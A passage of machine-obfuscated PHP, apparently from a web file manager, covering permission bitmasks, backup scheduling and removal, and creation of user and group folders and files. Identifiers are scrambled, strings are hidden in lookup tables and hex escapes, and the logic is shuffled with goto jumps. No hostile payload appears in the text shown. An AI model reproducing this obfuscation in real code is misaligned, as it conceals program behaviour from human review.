intval($f¤Ÿ²¨Èğ[$eçŞ­´‹Åƒ[417]]); if ($fİ¶´šŒÖ¼ <= 0 || $f¤Ÿ²¨Èğ[$eçŞ­´‹Åƒ[1741]] == 0) { continue; } if (($fİ¶´šŒÖ¼ & $eëê¯ó»‰) != $eëê¯ó»‰) { continue; } if (($fİ¶´šŒÖ¼ & $Eï„…Æ‹‰ß) != 0) { continue; } return $f¤Ÿ²¨Èğ[$eçŞ­´‹Åƒ[404]]; } return !1; } public function findAuthReadOnly() { $F´„Ò³Éøª = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $A’ÀŒ¢Ú¸ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($F´„Ò³Éøª, $A’ÀŒ¢Ú¸); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($e…é¸›à¢ = false, $EµéàÓá = "\x73\157\x72\x74", $eÌ”²ç…ƒÊ = false) { return parent::listData($e…é¸›à¢, $EµéàÓá, $eÌ”²ç…ƒÊ); } public function update($BÑ¹èäÃ¤, $fƒÅèğùÜ) { $A³Ü²ñ =& $_SERVER[œÕÊİğö]; $A¬Š£ÕÒùÂ = parent::listData($BÑ¹èäÃ¤); $c”÷ñ³³¨ = $this->findByName($fƒÅèğùÜ[$A³Ü²ñ[38]]); if (!$A¬Š£ÕÒùÂ || $c”÷ñ³³¨ && $c”÷ñ³³¨[$A³Ü²ñ[404]] != $A¬Š£ÕÒùÂ[$A³Ü²ñ[404]]) { return !1; } $this->filterAuth($fƒÅèğùÜ[$A³Ü²ñ[417]]); return parent::update($BÑ¹èäÃ¤, $fƒÅèğùÜ); } public function remove($CÓ…–äá’) { $A«®£±Åªå = parent::listData($CÓ…–äá’); if (!$A«®£±Åªå || $A«®£±Åªå[$_SERVER[œÕÊİğö][1193]]) { return !1; } return parent::remove($CÓ…–äá’); } public function add($F”ÕÁ ÂÌ = array()) { goto DŞ¿¾é£Ş; d¦õ¬ÃØËÌ: return parent::insert($F”ÕÁ ÂÌ); goto EÇÛ¯±Ì¬Ì; DŞ¿¾é£Ş: $dªù®Ú´ä =& $_SERVER[œÕÊİğö]; if ($this->findByName($F”ÕÁ ÂÌ[$dªù®Ú´ä[38]])) { return !1; } $c¡øÄÙâã = array($dªù®Ú´ä[38] => $dªù®Ú´ä[43], $dªù®Ú´ä[417] => 1, $dªù®Ú´ä[1742] => $dªù®Ú´ä[1730], $dªù®Ú´ä[1741] => 1, $dªù®Ú´ä[1193] => 0, $dªù®Ú´ä[1743] => 0); goto B° Á–¶Ç¶; B° Á–¶Ç¶: $F”ÕÁ ÂÌ = array_merge($c¡øÄÙâã, $F”ÕÁ ÂÌ); $F”ÕÁ ÂÌ[$dªù®Ú´ä[1743]] = $this->getSort(); $this->filterAuth($F”ÕÁ ÂÌ[$dªù®Ú´ä[417]]); goto d¦õ¬ÃØËÌ; EÇÛ¯±Ì¬Ì: } private function getSort() { $DÄÊùß†¡Í =& $_SERVER[œÕÊİğö]; $Cö‹½¿ÑÚ = parent::listData(); $EÅÂØÄ›½ = array_to_keyvalue($Cö‹½¿ÑÚ, $DÄÊùß†¡Í[43], $DÄÊùß†¡Í[1743]); return empty($EÅÂØÄ›½) ? 0 : max($EÅÂØÄ›½) + 1; } private function filterAuth(&$f«°£®ËèŠ) { goto d­èÙğ±¹¿; d­èÙğ±¹¿: if (!$f«°£®ËèŠ) { return; } $AÄ‡¸óÜ»— = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $EÎÍœÍâĞí = array(); goto b“ŒŒ ôäÀ; E’âÌ¤‰§¡: foreach ($EÎÍœÍâĞí as $eËé‘Œ‡ƒÔ) { if (isset($E¦¨ˆÆ†Õ[$eËé‘Œ‡ƒÔ])) { $EÎÍœÍâĞí = array_merge($EÎÍœÍâĞí, $E¦¨ˆÆ†Õ[$eËé‘Œ‡ƒÔ]); } } $EÎÍœÍâĞí[] = self::AUTH_SHOW; $f«°£®ËèŠ = array_sum(array_unique($EÎÍœÍâĞí)); goto B›º‰¿¢¡; b“ŒŒ ôäÀ: foreach ($AÄ‡¸óÜ»— as $eËé‘Œ‡ƒÔ) { if ($f«°£®ËèŠ & $eËé‘Œ‡ƒÔ) { $EÎÍœÍâĞí[] = $eËé‘Œ‡ƒÔ; } } if (in_array(self::AUTH_ROOT, $EÎÍœÍâĞí)) { $f«°£®ËèŠ = array_sum($AÄ‡¸óÜ»—); return; } $E¦¨ˆÆ†Õ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto E’âÌ¤‰§¡; B›º‰¿¢¡: } public function sort($Fƒ ÂÓ‚, $a“¿ö¸¥š¦) { return parent::update($Fƒ ÂÓ‚, $a“¿ö¸¥š¦); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\56\142\141\143\x6b\165\x70\x4c\151\x73\x74"; public $field = array("\x69\x6f", "\x6e\141\x6d\x65", "\x73\164\141\164\x75\x73", "\x63\157\x6e\x74\x65\156\164", "\x6d\x61\156\165\141\x6c", "\162\145\163\x75\x6c\x74", "\164\x69\155\145\x46\x72\157\155", "\x74\151\x6d\x65\124\x6f"); public function config() { goto dª­Õ°ªƒî; aë…øè›Š: $DËÖ˜Ï§‰Ù = is_array($DËÖ˜Ï§‰Ù) ? $DËÖ˜Ï§‰Ù : array(); if (!isset($DËÖ˜Ï§‰Ù[$BùåÏÆ‚´µ[745]])) { $DËÖ˜Ï§‰Ù[$BùåÏÆ‚´µ[745]] = $BùåÏÆ‚´µ[97]; } unset($DËÖ˜Ï§‰Ù[$BùåÏÆ‚´µ[1521]]); goto EŸÌõø¾¤®; Eà´ÑŒ»ñ: if (isset($DËÖ˜Ï§‰Ù[$BùåÏÆ‚´µ[207]])) { $aóÍô²ù˜¢[$BùåÏÆ‚´µ[207]][$BùåÏÆ‚´µ[1524]] = $DËÖ˜Ï§‰Ù[$BùåÏÆ‚´µ[207]]; unset($DËÖ˜Ï§‰Ù[$BùåÏÆ‚´µ[207]]); } return array_merge($aóÍô²ù˜¢, $DËÖ˜Ï§‰Ù); goto E‹ÉÖœ„ë; EŸÌõø¾¤®: Action($BùåÏÆ‚´µ[1744])->taskInit(); Model($BùåÏÆ‚´µ[1520])->cacheClear(); $eÑ£Ş‰îêŒ = $BùåÏÆ‚´µ[1745]; goto dÆ„Ö‡¯; dª­Õ°ªƒî: $BùåÏÆ‚´µ =& $_SERVER[œÕÊİğö]; $DËÖ˜Ï§‰Ù = Model($BùåÏÆ‚´µ[760])->get($BùåÏÆ‚´µ[772]); $DËÖ˜Ï§‰Ù = json_decode($DËÖ˜Ï§‰Ù, !0); goto aë…øè›Š; dÆ„Ö‡¯: $aóÍô²ù˜¢ = Model($BùåÏÆ‚´µ[1746])->findByKey($BùåÏÆ‚´µ[1539], $eÑ£Ş‰îêŒ); if (!$aóÍô²ù˜¢) { $aóÍô²ù˜¢ = array(); } if (isset($aóÍô²ù˜¢[$BùåÏÆ‚´µ[207]])) { $aóÍô²ù˜¢[$BùåÏÆ‚´µ[207]] = json_decode($aóÍô²ù˜¢[$BùåÏÆ‚´µ[207]], !0); } goto Eà´ÑŒ»ñ; E‹ÉÖœ„ë: } public function listData($AèÚ‘ŸÅ™ = false, $F‰¾Ğğ³‘Ñ = "\x6d\x6f\x64\151\x66\x79\x54\151\x6d\x65", $BªÕ²Ï’­  = false) { return parent::listData($AèÚ‘ŸÅ™, $F‰¾Ğğ³‘Ñ, !0); } public function lastItem() { $F³¼Ôõ½‡Ö = $this->listData(); return !empty($F³¼Ôõ½‡Ö[0]) ? $F³¼Ôõ½‡Ö[0] : null; } public function kill($f“ƒ³è§˜™) { goto E¤÷õßÁ; E¤÷õßÁ: $D‘Æù¯»© =& $_SERVER[œÕÊİğö]; $E“‚Ã³–Ú = $this->listData($f“ƒ³è§˜™); if (!$E“‚Ã³–Ú || empty($E“‚Ã³–Ú[$D‘Æù¯»©[38]])) { return !0; } goto AĞÜè†·ê‘; E¥ŒÄç§Óë: return $this->remove($f“ƒ³è§˜™); goto B§‚˜µøÈ˜; AĞÜè†·ê‘: Task::kill($D‘Æù¯»©[771]); Task::kill($D‘Æù¯»©[796]); Task::kill($D‘Æù¯»©[806]); goto A¹Ê¹¹–„‰; A¹Ê¹¹–„‰: $d³Š¡ã„®‹ = $E“‚Ã³–Ú[$D‘Æù¯»©[38]]; $fª¥®îò†ƒ = TEMP_FILES . $D‘Æù¯»©[768] . $d³Š¡ã„®‹ . $D‘Æù¯»©[8]; IO::remove($fª¥®îò†ƒ, !1); goto E¥ŒÄç§Óë; B§‚˜µøÈ˜: } public function remove($B¹Ë‚æÒß‹) { $fø…¬‹ô“™ = $this->listData($B¹Ë‚æÒß‹); if (!$fø…¬‹ô“™) { return !0; } return $this->backupRemove($fø…¬‹ô“™); } private function backupRemove($a”¨½ÂĞíŞ) { parent::remove($a”¨½ÂĞíŞ[$_SERVER[œÕÊİğö][404]]); $E„Åƒò±’• = $this->backupPath($a”¨½ÂĞíŞ); IO::remove($E„Åƒò±’•, !1); return !0; } private function backupPath($dÚåãÓˆ„Í) { $c†æù›§”Ë =& $_SERVER[œÕÊİğö]; $AĞĞçŒ¿™ = $dÚåãÓˆ„Í[$c†æù›§”Ë[38]]; $DŠŞæİØ = Model($c†æù›§”Ë[760])->get($c†æù›§”Ë[761]); $aãî³ÃËƒ¸ = substr(md5($c†æù›§”Ë[762] . $DŠŞæİØ . $AĞĞçŒ¿™), 0, 8); return "\173\x69\157\x3a{$dÚåãÓˆ„Í[$c†æù›§”Ë[742]]}\175\57\144\x61\164\141\x62\x61\163\145\57\x62\141\x63\x6b\x75\x70\x2f" . $AĞĞçŒ¿™ . $c†æù›§”Ë[81] . $aãî³ÃËƒ¸; } public function start() { goto aÈàğäÏ¨Ÿ; dÇªÄù×: $Dé«¤¼¶šÇ = new Backup(); $E°Ë™Øë½Ô = $Dé«¤¼¶šÇ->db(); if ($E°Ë™Øë½Ô) { $E°Ë™Øë½Ô = $Dé«¤¼¶šÇ->dbFile(); if ($E°Ë™Øë½Ô && $FŒªˆèö[$A²ŠŒ¶™ô[745]] == $A²ŠŒ¶™ô[201]) { $E°Ë™Øë½Ô = $Dé«¤¼¶šÇ->file(); } } goto aÕÌ©çÕñ; aÕÌ©çÕñ: Backup::set(array($A²ŠŒ¶™ô[740] => 1, $A²ŠŒ¶™ô[499] => time())); return !0; goto B½‘×¯‡äÑ; aÈàğäÏ¨Ÿ: $A²ŠŒ¶™ô =& $_SERVER[œÕÊİğö]; if ($GLOBALS[$A²ŠŒ¶™ô[6]][$A²ŠŒ¶™ô[98]][$A²ŠŒ¶™ô[1747]] != $A²ŠŒ¶™ô[97]) { return !0; } $FŒªˆèö = $this->config(); goto C…¹‡¦¸†Ø; C…¹‡¦¸†Ø: if (!$FŒªˆèö || $FŒªˆèö[$A²ŠŒ¶™ô[1521]] != $A²ŠŒ¶™ô[97]) { return !1; } $D–èšƒ¤· = $this->process(); foreach ($D–èšƒ¤· as $BŸ°§°½¶) { if ($BŸ°§°½¶) { return Task::restart($BŸ°§°½¶[$A²ŠŒ¶™ô[404]]); } } goto dÇªÄù×; B½‘×¯‡äÑ: } public function process() { $A«ÎÍá²¤… =& $_SERVER[œÕÊİğö]; return array($A«ÎÍá²¤…[748] => Task::get($A«ÎÍá²¤…[771]), $A«ÎÍá²¤…[752] => Task::get($A«ÎÍá²¤…[796]), $A«ÎÍá²¤…[203] => Task::get($A«ÎÍá²¤…[806])); } public function restore() { $a«ÜÏñèµ§ =& $_SERVER[œÕÊİğö]; ActionCall($a«ÜÏñèµ§[1041], !0, 1); ActionCall($a«ÜÏñèµ§[1041], !0, 0); } } goto A­¤ˆ’ç„Î; bÈÈŞá´”É: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($D¼ÉíÕæÚ) { $b‹¸‹¬ŞÏ¯ =& $_SERVER[œÕÊİğö]; $f‡ÁÕæ”Ô = Model($b‹¸‹¬ŞÏ¯[516])->where(array($b‹¸‹¬ŞÏ¯[1542] => $D¼ÉíÕæÚ))->find(); $D×çÃ™ë®æ = $this->_mkdirRoot(SourceModel::TYPE_USER, $D¼ÉíÕæÚ, $f‡ÁÕæ”Ô[$b‹¸‹¬ŞÏ¯[38]]); $this->userDesktopAdd($D×çÃ™ë®æ); return $D×çÃ™ë®æ; } public function userDesktopAdd($d“Ì…îËª—) { $aÒõ„Á—ïÆ =& $_SERVER[œÕÊİğö]; $FÇ†Œˆ¥ßÑ = LNG($aÒõ„Á—ïÆ[1980]); $b¥…ÕŞµÃ— = $this->mkdir($d“Ì…îËª—, $FÇ†Œˆ¥ßÑ); $this->metaSet($b¥…ÕŞµÃ—, $aÒõ„Á—ïÆ[1981], $aÒõ„Á—ïÆ[97]); $this->metaSet($d“Ì…îËª—, $aÒõ„Á—ïÆ[1982], $b¥…ÕŞµÃ—); } public function groupRootAdd($D©«ŠÁ¡À) { $fàËÃ¹ö„Â =& $_SERVER[œÕÊİğö]; $C¹¹³šÀÆæ = Model($fàËÃ¹ö„Â[525])->where(array($fàËÃ¹ö„Â[1804] => $D©«ŠÁ¡À))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $D©«ŠÁ¡À, $C¹¹³šÀÆæ[$fàËÃ¹ö„Â[38]]); } public function systemRootPathAdd($e„îÛÇ¼Ğˆ) { if ($e„îÛÇ¼Ğˆ != $_SERVER[œÕÊİğö][540]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $e„îÛÇ¼Ğˆ); } public function userRootRemove($fÃÒ¾šªë•) { $DùÒÜ×ö¸… = $this->sourceRoot(SourceModel::TYPE_USER, $fÃÒ¾šªë•); if (!$DùÒÜ×ö¸…) { return; } $this->remove($DùÒÜ×ö¸…, !1); } public function groupRootRemove($e‰áİè†) { $Bä›ÕÁö¤Ó = $this->sourceRoot(SourceModel::TYPE_GROUP, $e‰áİè†); if (!$Bä›ÕÁö¤Ó) { return; } $this->remove($Bä›ÕÁö¤Ó, !1); } private function _mkdirRoot($eè¹‹Ï…›, $DØ¸Æ—Ïäõ, $bË£ß¥»»”) { goto Fòì‘—ÈÔ¥; C¯õà›–Íñ: CacheLock::unlock($fĞ·½ç‚¤ä); return $bó³öÊ±ñ¼; goto bØòÔêËÕ¢; f—­âå‡ëÅ: $bó³öÊ±ñ¼ = $this->add($Dô®ˆÎãœƒ); $F­¾›Ú• = array($Eñƒ†´×Ìæ[589] => short_id($bó³öÊ±ñ¼)); $this->where(array($Eñƒ†´×Ìæ[421] => $bó³öÊ±ñ¼))->save($F­¾›Ú•); goto C¯õà›–Íñ; Fòì‘—ÈÔ¥: $Eñƒ†´×Ìæ =& $_SERVER[œÕÊİğö]; $Dô®ˆÎãœƒ = array($Eñƒ†´×Ìæ[405] => 0, $Eñƒ†´×Ìæ[583] => $eè¹‹Ï…›, $Eñƒ†´×Ìæ[584] => $DØ¸Æ—Ïäõ, $Eñƒ†´×Ìæ[580] => 1, $Eñƒ†´×Ìæ[585] => USER_ID, $Eñƒ†´×Ìæ[586] => USER_ID, $Eñƒ†´×Ìæ[581] => $Eñƒ†´×Ìæ[43], $Eñƒ†´×Ìæ[587] => $Eñƒ†´×Ìæ[534], $Eñƒ†´×Ìæ[433] => 0, $Eñƒ†´×Ìæ[582] => 0, $Eñƒ†´×Ìæ[471] => 0, $Eñƒ†´×Ìæ[588] => $Eñƒ†´×Ìæ[43]); if ($cêŞ¦„÷ë = $this->where($Dô®ˆÎãœƒ)->find()) { return $cêŞ¦„÷ë[$Eñƒ†´×Ìæ[406]]; } goto DìÈÜ·ÒÓÔ; DìÈÜ·ÒÓÔ: $fĞ·½ç‚¤ä = "\115\x6f\144\145\x6c\x53\x6f\165\162\143\145\x2e\155\153\x64\x69\162\x52\x6f\157\164\56{$eè¹‹Ï…›}\56{$DØ¸Æ—Ïäõ}\x2e" . $bË£ß¥»»”; CacheLock::lock($fĞ·½ç‚¤ä); $Dô®ˆÎãœƒ[$Eñƒ†´×Ìæ[38]] = $bË£ß¥»»”; goto f—­âå‡ëÅ; bØòÔêËÕ¢: } private function sourceRoot($a‹‚¡ÃÕî, $b ³İ¢»ŞŞ, $Bä—’¬‹š° = false) { $E·Ûß²À¿ =& $_SERVER[œÕÊİğö]; $e­ğ¥‰Å· = array($E·Ûß²À¿[405] => 0, $E·Ûß²À¿[583] => $a‹‚¡ÃÕî, $E·Ûß²À¿[584] => $b ³İ¢»ŞŞ); if ($cÏÅâáô‹à = $this->where($e­ğ¥‰Å·)->find()) { return $Bä—’¬‹š° ? $cÏÅâáô‹à : $cÏÅâáô‹à[$E·Ûß²À¿[406]]; } return !1; } public function sourceRootGroup($FÀÆ‰ÇšŞÍ) { goto D‚ˆê˜Ø‹¯; D‚ˆê˜Ø‹¯: $fÄøé‹ÅØš =& $_SERVER[œÕÊİğö]; if (is_string($FÀÆ‰ÇšŞÍ)) { $FÀÆ‰ÇšŞÍ = array($FÀÆ‰ÇšŞÍ); } $B£Û¯ÄÅŸÙ = array($fÄøé‹ÅØš[405] => 0, $fÄøé‹ÅØš[584] => array($fÄøé‹ÅØš[7], $FÀÆ‰ÇšŞÍ), $fÄøé‹ÅØš[583] => SourceModel::TYPE_GROUP); goto a ã¬„èëœ; eŠ‹åÀÇ”·: return array_to_keyvalue($Fù›«Š×[$fÄøé‹ÅØš[85]], $fÄøé‹ÅØš[507]); goto fÄÅİ«¿â ; a ã¬„èëœ: $this->selectPageReset(); $Fù›«Š× = $this->limit(count($FÀÆ‰ÇšŞÍ))->listSource($B£Û¯ÄÅŸÙ, 1000); $this->selectPageRestore(); goto eŠ‹åÀÇ”·; fÄÅİ«¿â : } public function mkfile($b£¢×ËÊÓ¢, $Bˆç½Ò„ÍÇ, $D²¬Ä¤ÌÍ = '', $c¶½òë¹Ì = REPEAT_RENAME) { $CÊÏ İ„ù =& $_SERVER[œÕÊİğö]; $Cµ©¶˜ó–í = Model($CÊÏ İ„ù[606])->addFileByContent($D²¬Ä¤ÌÍ, $Bˆç½Ò„ÍÇ); return $this->_createFileCall($b£¢×ËÊÓ¢, $Bˆç½Ò„ÍÇ, $Cµ©¶˜ó–í, $c¶½òë¹Ì, $CÊÏ İ„ù[1238]); } public function addFile($EïŠ¾«ø, $A‚¯©¯½Ş, $FÍÏŠÚÔ, $eÄ¶¦Ë¢ò = false, $fÒÛí³¨Ò = REPEAT_RENAME) { $BŠ”òß = Model($_SERVER[œÕÊİğö][606])->addFile($A‚¯©¯½Ş, $FÍÏŠÚÔ, $eÄ¶¦Ë¢ò); return $this->_createFileCall($EïŠ¾«ø, $FÍÏŠÚÔ, $BŠ”òß, $fÒÛí³¨Ò); } public function addFileByFileID($bˆ‡¤ñª¾, $Bî¶ùâÑâõ, $DôÈÏ¡…ã, $aõ‡Õù = REPEAT_RENAME) { $c¥‚‰‚ˆÅù =& $_SERVER[œÕÊİğö]; $Dæôİƒ£Ï = Model($c¥‚‰‚ˆÅù[606])->find($Bî¶ùâÑâõ); Model($c¥‚‰‚ˆÅù[606])->linkAdd($Bî¶ùâÑâõ); return $this->_createFileCall($bˆ‡¤ñª¾, $DôÈÏ¡…ã, $Dæôİƒ£Ï, $aõ‡Õù); } public function addFileByRemote($E–Ş­ôº¥ù, $EÔ¥‚„÷éó, $AÛšõò·, $CöÁ•„’óï = array(), $bì‰„“â… = REPEAT_RENAME) { $eÔêŠ¶äô™ = Model($_SERVER[œÕÊİğö][606])->addFileByRemote($EÔ¥‚„÷éó, $AÛšõò·, $CöÁ•„’óï); return $this->_createFileCall($E–Ş­ôº¥ù, $AÛšõò·, $eÔêŠ¶äô™, $bì‰„“â…); } private function _createFileCall($dØµÙÁ‰²Ã, $bğæ‡İÙ³«, $d„èæˆË£™, $A„ò–™›¯ë, $b–Ù¹å“­Î = "\165\160\x6c\157\x61\144") { goto Eâ“¯ˆŞÙ; DÇŠöÚÈ©È: $this->lockWriteStart($dØµÙÁ‰²Ã, $bğæ‡İÙ³«); $eØ°ÏäœÖĞ = $this->fileNameExist($dØµÙÁ‰²Ã, $bğæ‡İÙ³«); $bË®ï™¾Œ = $this->_createFile($dØµÙÁ‰²Ã, $bğæ‡İÙ³«, $d„èæˆË£™, $A„ò–™›¯ë, $C§¡éÀÃ‹ù); goto E÷—äïÒèø; cÒ ŞÅÑİò: return $bË®ï™¾Œ; goto fÇó÷Õ¢ê; Eâ“¯ˆŞÙ: $Dõ¡¢æ¢ÌÖ =& $_SERVER[œÕÊİğö]; $C§¡éÀÃ‹ù = !1; $this->setMasterDB(); goto DÇŠöÚÈ©È; E÷—äïÒèø: if (!$C§¡éÀÃ‹ù) { Model($Dõ¡¢æ¢ÌÖ[473])->remove($d„èæˆË£™[$Dõ¡¢æ¢ÌÖ[470]]); } if ($C§¡éÀÃ‹ù && $bË®ï™¾Œ && $bË®ï™¾Œ != $eØ°ÏäœÖĞ) { Model($Dõ¡¢æ¢ÌÖ[1953])->eventCreate($bË®ï™¾Œ, $b–Ù¹å“­Î); } $this->lockWriteEnd($dØµÙÁ‰²Ã, $bğæ‡İÙ³«); goto cÒ ŞÅÑİò; fÇó÷Õ¢ê: } public function mkdir($c¯ßø¥¡ó¯, $Fƒß£É´ï, $fæ“£ÄÊÖ = REPEAT_SKIP) { goto d›º‡ÖËè¦; d›º‡ÖËè¦: $Fé¦ÀŞ¯ŠÀ =& $_SERVER[œÕÊİğö]; $this->setMasterDB(); $FÆ´áµö › = $this->sourceInfo($c¯ßø¥¡ó¯); goto C±Œ½‚øí…; F®İí·ò‚‡: $Få‹˜á¡£È = array($Fé¦ÀŞ¯ŠÀ[580] => 1, $Fé¦ÀŞ¯ŠÀ[424] => $Fƒß£É´ï, $Fé¦ÀŞ¯ŠÀ[581] => $Fé¦ÀŞ¯ŠÀ[43], $Fé¦ÀŞ¯ŠÀ[471] => 0, $Fé¦ÀŞ¯ŠÀ[582] => 0); $EÙ„‡ÍŠš = $this->_addSoure($Få‹˜á¡£È, $FÆ´áµö ›); Model($Fé¦ÀŞ¯ŠÀ[1953])->eventCreate($EÙ„‡ÍŠš, $Fé¦ÀŞ¯ŠÀ[1239]); goto bïÅ·ø¬‹ª; bïÅ·ø¬‹ª: $this->lockWriteEnd($c¯ßø¥¡ó¯, $Fƒß£É´ï); return $EÙ„‡ÍŠš; goto EÑ·†µßß; C±Œ½‚øí…: if (!$FÆ´áµö ›) { return !1; } $this->lockWriteStart($c¯ßø¥¡ó¯, $Fƒß£É´ï); if ($fæ“£ÄÊÖ !== !1) { $CçŒˆáË‘ = $this->fileNameExist($c¯ßø¥¡ó¯, $Fƒß£É´ï); if ($CçŒˆáË‘ && $fæ“£ÄÊÖ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($c¯ßø¥¡ó¯, $Fƒß£É´ï); return $CçŒˆáË‘; } $Fƒß£É´ï = $this->fileNameAuto($c¯ßø¥¡ó¯, $Fƒß£É´ï, $fæ“£ÄÊÖ); } goto F®İí·ò‚‡; EÑ·†µßß: } private function _createFile($eì¤©İ‘·˜, $Eİš‹„ƒƒ, $b¼½Çë±­á, $dö¹©ô§‘, &$d‰Ô—–ÉƒÀ) { goto C™ÎÖ¢çÉö; C™ÎÖ¢çÉö: $fô©…ã«¾Ÿ =& $_SERVER[œÕÊİğö]; $eõ¸áºŠ¯ = $this->sourceInfo($eì¤©İ‘·˜); if (!$b¼½Çë±­á || !$eõ¸áºŠ¯) { return !1; } goto E÷ˆ‡ÓÒë; aÓ•ŞÜ¦õŸ: return $Dµíõ¤¤Ì; goto FŒµË×Õ½; b©Ï­°í¨ˆ: $FÅí¬†“… = array($fô©…ã«¾Ÿ[580] => 0, $fô©…ã«¾Ÿ[424] => $Eİš‹„ƒƒ, $fô©…ã«¾Ÿ[581] => substr(get_path_ext($Eİš‹„ƒƒ), 0, 10), $fô©…ã«¾Ÿ[471] => $b¼½Çë±­á[$fô©…ã«¾Ÿ[470]], $fô©…ã«¾Ÿ[582] => $b¼½Çë±­á[$fô©…ã«¾Ÿ[88]]); $Dµíõ¤¤Ì = $this->_addSoure($FÅí¬†“…, $eõ¸áºŠ¯); $this->folderSizeReset($eì¤©İ‘·˜, intval($FÅí¬†“…[$fô©…ã«¾Ÿ[88]])); goto aÓ•ŞÜ¦õŸ; E÷ˆ‡ÓÒë: if ($dö¹©ô§‘ !== !1) { $A ¡ÖöéÂ = $this->fileNameExist($eì¤©İ‘·˜, $Eİš‹„ƒƒ); } $d‰Ô—–ÉƒÀ = !0; if ($dö¹©ô§‘ && $A ¡ÖöéÂ) { if ($dö¹©ô§‘ == REPEAT_SKIP) { $d‰Ô—–ÉƒÀ = !1; return $A ¡ÖöéÂ; } else { if ($dö¹©ô§‘ == REPEAT_REPLACE) { $dšèêâÄœ = $this->sourceInfo($A ¡ÖöéÂ); $cö¸‡˜Ì = $this->fileHistory($dšèêâÄœ, $b¼½Çë±­á[$fô©…ã«¾Ÿ[470]], $b¼½Çë±­á[$fô©…ã«¾Ÿ[88]]); if (!$cö¸‡˜Ì) { $d‰Ô—–ÉƒÀ = !1; } else { $this->folderSizeReset($eì¤©İ‘·˜); } return $A ¡ÖöéÂ; } else { $Eİš‹„ƒƒ = $this->fileNameAuto($eì¤©İ‘·˜, $Eİš‹„ƒƒ, $dö¹©ô§‘, !1); } } } goto b©Ï­°í¨ˆ; FŒµË×Õ½: } protected function fileHistory($fëæ§…·‰Î, $DÉ¹†Ùö—™, $AØìÕøŒ¡) { goto b‚ÇÉÄäğ; FÂÁ‡Ûãğ©: $this->where(array($E­ô¶µÅ†Ç[421] => $fëæ§…·‰Î[$E­ô¶µÅ†Ç[406]]))->save($a«›¯Ò‹Ó); $this->sourceCacheClear($fëæ§…·‰Î[$E­ô¶µÅ†Ç[406]]); return !0; goto DöÌ·‰ß; Bø¶ÁŞš½¹: $this->checkLock($fëæ§…·‰Î[$E­ô¶µÅ†Ç[406]], $DÉ¹†Ùö—™); Model($E­ô¶µÅ†Ç[1983])->addHistory($fëæ§…·‰Î); $a«›¯Ò‹Ó = array($E­ô¶µÅ†Ç[586] => $E¿Â¨ ËÁ, $E­ô¶µÅ†Ç[428] => time(), $E­ô¶µÅ†Ç[470] => $DÉ¹†Ùö—™, $E­ô¶µÅ†Ç[88] => $AØìÕøŒ¡); goto FÂÁ‡Ûãğ©; b‚ÇÉÄäğ: $E­ô¶µÅ†Ç =& $_SERVER[œÕÊİğö]; $E¿Â¨ ËÁ = defined($E­ô¶µÅ†Ç[477]) ? USER_ID : $E­ô¶µÅ†Ç[201]; if ($fëæ§…·‰Î[$E­ô¶µÅ†Ç[470]] == $DÉ¹†Ùö—™) { return !1; } goto Bø¶ÁŞš½¹; DöÌ·‰ß: } public function checkLock($a’µõê•à, $fîßë™¿ƒì) { goto aŒöŠíÙ‹”; c±µÎ‹ßìÊ: show_json(LNG($f¨öŞÕâôŒ[1986]) . $f¨öŞÕâôŒ[1987] . LNG($f¨öŞÕâôŒ[1988]) . $f¨öŞÕâôŒ[1989] . $aœğæ¨™¢â . $f¨öŞÕâôŒ[1990], !1); goto a»É¬ôƒÇ; E²ŠÏÇŠø„: $E·‹”ëóÉÙ = Session::get($f¨öŞÕâôŒ[1984]); $cĞõïÀòƒ‹ = substr($D¦§ˆäàö[$f¨öŞÕâôŒ[38]], 0, -1 - strlen($D¦§ˆäàö[$f¨öŞÕâôŒ[178]])) . $f¨öŞÕâôŒ[1503] . $E·‹”ëóÉÙ . $f¨öŞÕâôŒ[105] . $D¦§ˆäàö[$f¨öŞÕâôŒ[178]]; $c­ÈÉ™Š°Ó = Model($f¨öŞÕâôŒ[606])->find($fîßë™¿ƒì); goto B“ô†ĞÈ±¬; B“ô†ĞÈ±¬: $this->_createFileCall($D¦§ˆäàö[$f¨öŞÕâôŒ[501]], $cĞõïÀòƒ‹, $c­ÈÉ™Š°Ó, REPEAT_REPLACE, $f¨öŞÕâôŒ[1238]); $eŠµÍˆÕó = $D¦§ˆäàö[$f¨öŞÕâôŒ[468]][$f¨öŞÕâôŒ[545]]; $aœğæ¨™¢â = $eŠµÍˆÕó[$f¨öŞÕâôŒ[1985]] ? $eŠµÍˆÕó[$f¨öŞÕâôŒ[1985]] : $eŠµÍˆÕó[$f¨öŞÕâôŒ[38]]; goto c±µÎ‹ßìÊ; aŒöŠíÙ‹”: $f¨öŞÕâôŒ =& $_SERVER[œÕÊİğö]; $D¦§ˆäàö = $this->pathInfo($a’µõê•à); if (!$this->fileIsLock($D¦§ˆäàö, !0)) { return; } goto E²ŠÏÇŠø„; a»É¬ôƒÇ: } public function fileIsLock($fÅïÛè¥™‹, $d»óš±©Š = false) { goto AİÍãÔîö×; EÀÚ„Ù: $F°ƒˆÕäëª = $GLOBALS[$cˆÉà™„‹Ê[6]][$cˆÉà™„‹Ê[98]][$cˆÉà™„‹Ê[543]]; if ($fÅïÛè¥™‹[$cˆÉà™„‹Ê[468]][$cˆÉà™„‹Ê[544]] <= time() - $F°ƒˆÕäëª) { $this->metaSet($fÅïÛè¥™‹[$cˆÉà™„‹Ê[406]], $cˆÉà™„‹Ê[542], null); $this->metaSet($fÅïÛè¥™‹[$cˆÉà™„‹Ê[406]], 